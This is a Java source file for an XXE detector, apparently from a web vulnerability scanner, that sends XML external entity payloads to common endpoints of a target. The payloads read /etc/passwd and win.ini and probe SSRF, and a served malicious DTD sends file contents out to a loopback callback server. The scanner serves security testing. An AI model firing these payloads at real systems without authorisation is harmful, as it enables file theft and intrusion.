package it.r2u.anibus.service.analysis;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.function.DoubleConsumer;

/**
 * XXE (XML External Entity) injection detector.
 * Sends crafted XML payloads containing entity references to common XML-accepting
 * endpoints and looks for indicators that the entity was resolved by the server.
 */
public class XxeDetector {

    private static final int TIMEOUT = 8000;

    /** Canary string we embed in entity declarations; its presence in the response indicates XXE. */
    private static final String CANARY = "xxe-anibus-7k3b";

    /** Marker used by error-based payloads — forces parser to mention a non-existent path. */
    private static final String ERROR_MARKER = "anibus-nope-" + CANARY;

    /**
     * XXE payloads — each tries a different technique:
     * classic file read, error-based, SSRF via DTD.
     */
    private static final List<String> PAYLOADS = List.of(
        // Classic: try to read /etc/passwd
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        // Windows path
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>",
        // Error-based blind XXE
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">%xxe;]><root/>",
        // SSRF to localhost
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1/\">]><root>&xxe;</root>",
        // Billion laughs — send small payload to detect parse but don't actually use it
        "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]><root>&lol2;</root>",
        // Error-based via undefined system path — server echoes parser error containing our marker,
        // confirming the DTD was actually parsed (works even when out-of-band is blocked).
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///" + ERROR_MARKER + "\">]><root>&xxe;</root>",
        // Error-based via SSRF to closed local port — expect "Connection refused" in parser output
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:1/" + ERROR_MARKER + "\">]><root>&xxe;</root>"
    );

    /** Strings in the response body that indicate successful XXE exploitation. */
    private static final List<String> INDICATORS = List.of(
        "root:x:0:0",     // /etc/passwd content
        "daemon:x:",
        "/bin/bash",
        "[fonts]",        // win.ini
        "for 16-bit",     // win.ini
        "127.0.0.1",      // SSRF reflected
        "localhost",
        "Connection refused", // error-based SSRF probe
        "failed to open stream", // PHP libxml error
        "DOCTYPE is disallowed", // sometimes leaks raw parser msg
        ERROR_MARKER,         // our error-based marker echoed back
        CANARY
    );

    /** Common endpoints that accept XML. */
    private static final List<String> XML_PATHS = List.of(
        "/", "/api", "/api/v1", "/upload", "/import",
        "/xml", "/soap", "/wsdl", "/service", "/ws",
        "/process", "/parse", "/data", "/feed", "/rss"
    );

    public record XxeResult(
        String url,
        String payload,
        boolean vulnerable,
        String evidence
    ) {
        public String risk() { return vulnerable ? "CRITICAL" : "NONE"; }
    }

    /**
     * Probes the target URL for XXE vulnerabilities.
     *
     * @param baseUrl  Target base URL
     * @param progress 0.0–1.0 progress callback
     * @return List of findings
     */
    public List<XxeResult> scan(String baseUrl, DoubleConsumer progress) {
        List<XxeResult> findings = new ArrayList<>();
        if (baseUrl == null || baseUrl.isBlank()) return findings;

        String base = baseUrl.replaceAll("/$", "");
        int total = XML_PATHS.size() * PAYLOADS.size();
        int done = 0;

        for (String path : XML_PATHS) {
            String url = base + path;
            for (String payload : PAYLOADS) {
                XxeResult r = probe(url, payload);
                if (r != null && r.vulnerable()) findings.add(r);
                done++;
                if (progress != null) progress.accept((double) done / total);
            }
        }
        return findings;
    }

    private XxeResult probe(String url, String payload) {
        try {
            HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(TIMEOUT);
            conn.setReadTimeout(TIMEOUT);
            conn.setRequestProperty("Content-Type", "application/xml");
            conn.setRequestProperty("Accept", "*/*");

            byte[] bodyBytes = payload.getBytes(StandardCharsets.UTF_8);
            conn.setRequestProperty("Content-Length", String.valueOf(bodyBytes.length));
            try (OutputStream os = conn.getOutputStream()) {
                os.write(bodyBytes);
            }

            int status = conn.getResponseCode();
            if (status == 0) return null;

            String body = "";
            try {
                body = new String(conn.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            } catch (IOException ignored) {
                try {
                    body = new String(conn.getErrorStream().readAllBytes(), StandardCharsets.UTF_8);
                } catch (IOException | NullPointerException ignored2) { }
            }
            conn.disconnect();

            for (String indicator : INDICATORS) {
                if (body.contains(indicator)) {
                    String evidence = extractWindow(body, indicator, 150);
                    return new XxeResult(url, abbreviate(payload, 80), true,
                        "Indicator '" + indicator + "' in response: " + evidence);
                }
            }

        } catch (IOException | IllegalArgumentException ignored) { }
        return null;
    }

    private String extractWindow(String text, String needle, int window) {
        int idx = text.indexOf(needle);
        if (idx < 0) return "";
        int start = Math.max(0, idx - window / 2);
        int end   = Math.min(text.length(), idx + needle.length() + window / 2);
        return "…" + text.substring(start, end).replaceAll("\\s+", " ").trim() + "…";
    }

    private String abbreviate(String s, int max) {
        if (s == null || s.length() <= max) return s;
        return s.substring(0, max) + "…";
    }

    /**
     * Variant of {@link #scan(String, DoubleConsumer)} that establishes a
     * baseline body length per endpoint by first sending a benign empty XML
     * document, then only reports an XXE finding when the payloaded response
     * either contains a known indicator OR differs from the baseline by more
     * than a small fraction (≥20% length delta). This significantly reduces
     * false positives on endpoints that echo any XML body back verbatim.
     */
    public List<XxeResult> scanWithBaseline(String baseUrl, DoubleConsumer progress) {
        List<XxeResult> findings = new ArrayList<>();
        if (baseUrl == null || baseUrl.isBlank()) return findings;
        String base = baseUrl.replaceAll("/$", "");
        int total = XML_PATHS.size() * (PAYLOADS.size() + 1);
        int done = 0;
        String benign = "<?xml version=\"1.0\"?><root>anibus-baseline</root>";
        for (String path : XML_PATHS) {
            String url = base + path;
            int baselineLen = bodyLength(url, benign);
            done++;
            if (progress != null) progress.accept((double) done / total);
            for (String payload : PAYLOADS) {
                XxeResult r = probe(url, payload);
                if (r != null && r.vulnerable()) {
                    findings.add(r);
                } else if (baselineLen >= 0) {
                    int len = bodyLength(url, payload);
                    if (len >= 0 && baselineLen > 0
                            && Math.abs(len - baselineLen) > Math.max(64, baselineLen / 5)) {
                        findings.add(new XxeResult(url, abbreviate(payload, 80), true,
                            "Response size diverges from baseline (" + baselineLen + " → " + len
                            + " bytes) — possible blind XXE / SSRF."));
                    }
                }
                done++;
                if (progress != null) progress.accept((double) done / total);
            }
        }
        return findings;
    }

    private int bodyLength(String url, String payload) {
        try {
            HttpURLConnection conn = (HttpURLConnection) URI.create(url).toURL().openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(TIMEOUT);
            conn.setReadTimeout(TIMEOUT);
            conn.setRequestProperty("Content-Type", "application/xml");
            byte[] bytes = payload.getBytes(StandardCharsets.UTF_8);
            try (OutputStream os = conn.getOutputStream()) { os.write(bytes); }
            byte[] body;
            try {
                body = conn.getInputStream().readAllBytes();
            } catch (IOException e) {
                InputStream err = conn.getErrorStream();
                body = err == null ? new byte[0] : err.readAllBytes();
            }
            conn.disconnect();
            return body.length;
        } catch (IOException | IllegalArgumentException e) {
            return -1;
        }
    }

    public static String formatReport(List<XxeResult> results, String baseUrl) {
        StringBuilder sb = new StringBuilder("=== XXE SCAN: ").append(baseUrl).append(" ===\n");
        if (results == null || results.isEmpty()) {
            sb.append("  No XXE indicators detected.\n");
            return sb.toString();
        }
        sb.append("  ").append(results.size()).append(" potential XXE finding(s):\n");
        for (XxeResult r : results) {
            sb.append("\n  [").append(r.risk()).append("] ").append(r.url()).append("\n");
            sb.append("    payload : ").append(r.payload()).append("\n");
            sb.append("    evidence: ").append(r.evidence()).append("\n");
        }
        return sb.toString();
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  OOB (Out-of-Band) scan — loopback callback server
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Full XXE scan combining indicator-based and out-of-band detection.
     *
     * <p>Phase 1 runs the standard indicator scan ({@link #scan}).
     * Phase 2 starts a {@link LoopbackCallbackServer} on a random loopback port,
     * embeds its URL as a unique token in every probe, fires all probes at once,
     * waits {@value #OOB_WAIT_MS} ms, then maps received callbacks back to the
     * originating endpoint URL.
     *
     * <p>The loopback server also serves a malicious parameter-entity DTD at
     * {@code /oob.dtd} — if the parser fetches that DTD it will attempt a second
     * exfiltration request which is captured in the same hits list.
     *
     * <p>This approach works without any external OAST service and is safe for
     * targets that are on the same host or in the same local network as the scanner.
     */
    public List<XxeResult> scanWithOob(String baseUrl, DoubleConsumer progress) {
        List<XxeResult> findings = new ArrayList<>();
        if (baseUrl == null || baseUrl.isBlank()) return findings;

        // Phase 1: standard indicator-based scan (50% of progress)
        findings.addAll(scan(baseUrl, progress == null ? null : p -> progress.accept(p * 0.5)));

        // Phase 2: OOB via loopback callback server
        try (LoopbackCallbackServer oob = LoopbackCallbackServer.start()) {
            int oobPort = oob.port();
            String cbBase = "http://127.0.0.1:" + oobPort + "/";

            // Malicious DTD served at /oob.dtd — triggers secondary exfiltration attempt
            // when a vulnerable parser loads it via parameter entity
            String dtdContent = """
                    <!ENTITY %% file SYSTEM "file:///etc/passwd">
                    <!ENTITY %% all "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:%d/exfil?f=%%file;'>">
                    %%all;
                    %%exfil;
                    """.formatted(oobPort);
            oob.registerResponse("/oob.dtd", "application/xml-dtd", dtdContent);

            // Token → originating URL map for attributing callbacks
            Map<String, String> tokenToUrl = new LinkedHashMap<>();

            String base = baseUrl.replaceAll("/$", "");
            int pi = 0;
            for (String path : XML_PATHS) {
                String url = base + path;
                // Three OOB techniques per endpoint, each with a unique loopback token path
                String t1 = "oob-" + pi + "-ge";    // general entity
                String t2 = "oob-" + pi + "-ds";    // DOCTYPE SYSTEM
                String t3 = "oob-" + pi + "-pe";    // parameter entity → /oob.dtd
                tokenToUrl.put("/" + t1, url);
                tokenToUrl.put("/" + t2, url);
                tokenToUrl.put("/" + t3, url);
                tokenToUrl.put("/oob.dtd", url); // secondary exfil hit also maps here
                pi++;
            }

            // Fire all OOB probes rapidly
            pi = 0;
            int total = XML_PATHS.size();
            for (String path : XML_PATHS) {
                String url = base + path;
                String t1 = "oob-" + pi + "-ge";
                String t2 = "oob-" + pi + "-ds";
                String t3 = "oob-" + pi + "-pe";

                // Technique 1 — general entity with loopback SYSTEM URI
                probe(url, "<?xml version=\"1.0\"?><!DOCTYPE foo ["
                    + "<!ENTITY oob SYSTEM \"" + cbBase + t1 + "\">]><root>&oob;</root>");
                // Technique 2 — DOCTYPE SYSTEM request (some parsers fetch the DTD URL directly)
                probe(url, "<?xml version=\"1.0\"?><!DOCTYPE root SYSTEM \""
                    + cbBase + t2 + "\"><root/>");
                // Technique 3 — parameter entity loads our malicious DTD for exfil attempt
                probe(url, "<?xml version=\"1.0\"?><!DOCTYPE foo ["
                    + "<!ENTITY % xxe SYSTEM \"" + cbBase + t3 + "oob.dtd\">%xxe;]><root/>");

                pi++;
                if (progress != null) progress.accept(0.5 + 0.35 * pi / total);
            }

            // Wait for async callbacks from target XML parsers
            try {
                Thread.sleep(OOB_WAIT_MS);
            } catch (InterruptedException ie) {
                Thread.currentThread().interrupt();
            }

            // Map received hits back to originating URLs
            Map<String, List<String>> urlToHits = new LinkedHashMap<>();
            for (String hit : oob.hits()) {
                // hit format: "GET /oob-0-ge HTTP/1.1"
                String hitPath = "/";
                String[] parts = hit.split(" ");
                if (parts.length >= 2) hitPath = parts[1].split("\\?")[0];

                String origUrl = tokenToUrl.get(hitPath);
                if (origUrl != null) {
                    urlToHits.computeIfAbsent(origUrl, k -> new ArrayList<>()).add(hit);
                }
            }

            for (Map.Entry<String, List<String>> entry : urlToHits.entrySet()) {
                findings.add(new XxeResult(entry.getKey(), "[OOB probes]", true,
                    "[OOB CONFIRMED] Blind XXE — loopback callback(s) received: " + entry.getValue()));
            }

            if (progress != null) progress.accept(1.0);
        } catch (IOException ignored) {
            // OOB server failed to start (e.g. port exhaustion) — Phase 1 results still returned
        }
        return findings;
    }

    /** Milliseconds to wait after firing all OOB probes before checking callbacks. */
    private static final long OOB_WAIT_MS = 3_000;
}
